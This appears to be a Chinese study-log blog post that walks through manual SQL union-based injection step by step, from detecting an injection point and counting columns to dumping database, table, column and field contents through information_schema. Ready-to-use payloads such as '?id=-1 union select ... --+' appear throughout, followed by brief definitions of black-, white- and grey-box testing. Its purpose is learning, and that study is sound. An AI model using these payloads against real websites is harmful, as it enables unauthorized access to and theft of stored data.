title: SQL联合注入
author: liuGuobin
tags:
  - 日报
categories:
  - 日报
date: 2023-03-12 00:47:00
---
### SQL联合注入
#### 表现
有回显且可进行联合查询
#### 原理
SQL中union select查询的方式将结果合在一起，并删除重复的数据。这就是联合查询。
#### 开始注入
1、判断是否存在注入点
（1）修改参数值，查看数据是否改变
（2）插入单、双引号的检测方法，未闭合的单引号会有报错

2、判断注入点是整形还是字符型
（1）数字型：通过
```
and 1=1
```
（2）字符串型：闭合单引号测试语句
```
'and'1'='1
```

3、判断查询列数
```
select username,password from where username='root' and password=123 order by x
```
当输入x报错时，真实的列数是「x-1」
(1)为什么用order by 可以证明前面语句查询了三列数据呢？
&emsp;&emsp;select * from order by (你要按照排序的对象)
&emsp;&emsp;order by可以按照指定的「字段名」排序
&emsp;&emsp;还可以按照「索引」进行排序，索引就是从左至右将列名按照123排序
&emsp;&emsp;对MySQL中查询结果按照指定字段名进行排序，左边第一个字段对应的索引是 1
&emsp;&emsp;当输入的索引溢出时它就会报错。
(2)我们为什么要知道前面查询了多少语句呢？
&emsp;&emsp;因为union前面查询语句查询的元素与后面查询语句查询的元素要在数量上一样
&emsp;&emsp;select 甲,乙,丙 union select 1,2,3
&emsp;&emsp;因为前面查询的语句有三个元素（甲，乙，丙）
&emsp;&emsp;所以后面查询的语句必须是三个元素（1，2，3）

4、找到显示位
```
?id=-1 union select 1,2,3,4,5,6 --+
```
如果在使用UNION SELECT 1,2,3…,11 from table时，网页中显示了信息8
那么说明网页只能够显示第8列中信息，不能显示其他列的信息。
也可以理解为网页只开放了8这个窗口，你想要查询数据库信息就必须要通过这个窗口。
所以如果我们想要知道某个属性的值，比如admin；
就要把admin属性放到8的位置上，这样就能通过第8列爆出admin的信息。
但是为了爆出第一位后面的显示位需要隐藏正常结果
比如将id=1改为id=-1，使union前面的语句报错，执行后面的，爆出显示位

5、利用显示位获取库名
```
select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA
```
在高版本中查询该表就行，具体看上一篇文章。
group_concat()函数将所有查询的库名连在一起成为一条数据
```
?id=-1' union select 1,database(),3 --+
```
假设判断出在2号位显示，那么在二号位换成想插入的SQL语句就行了。
相同的，这里也要让union前面的语句报错，执行后面的。

6、获取表名
```
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='库名' --+
```
相同的，这里也要让union前面的语句报错，执行后面的。
group_concat()函数将所有查询的表名连在一起成为一条数据

7、查询表中列名
```
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+
```
数据库有个information_schema库，里面有个columns表，存有整个数据库的列名。
我们要去查找的列，就是在这个库中去找。

8、获取字段信息
```
?id=-1’ union select 1,group_concat(列名),3 from 库名.表名 --+
```
平平无奇，跟上面的没啥不同，等价于下面这条
```
?id=-1’ union select 1,列名,3 from 库名.表名 limit 0,1 --+
```

#### 联合查询注入是最简单的了，一定要完全看懂

### 黑盒，白盒，灰盒测试
#### 黑盒测试（测试功能）
黑盒测试是以用户的角度，从输入数据与输出数据的对应关系出发进行测试的。
目的是检测程序是否能适当地接收输入数据而产生正确的输出信息。
很明显，如果外部特性本身设计有问题或规格说明的规定有误，用黑盒测试方法是发现不了的。

#### 白盒测试（优化程序）
以开发者的角度，对程序内部细节的严密检验

#### 灰盒测试（修复bug）
多用于集成测试阶段，不仅关注输出、输入的正确性，同时也关注程序内部的情况。
灰盒测试不像白盒那样详细、完整，但又比黑盒测试更关注程序的内部逻辑。
常常是通过一些表征性的现象、事件、标志来判断内部的运行状态。